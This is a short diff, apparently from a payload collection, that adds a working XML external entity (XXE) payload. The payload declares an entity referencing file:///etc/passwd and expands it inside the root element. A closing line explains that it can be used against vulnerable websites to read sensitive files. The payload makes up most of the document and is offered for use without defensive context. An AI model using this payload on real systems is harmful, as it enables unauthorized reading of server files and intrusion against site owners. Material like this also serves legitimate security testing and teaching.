@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+
+Above XML snippet can be used in websites vulnerable to XXE to read sensitive files, in that case it is `/etc/passwd`
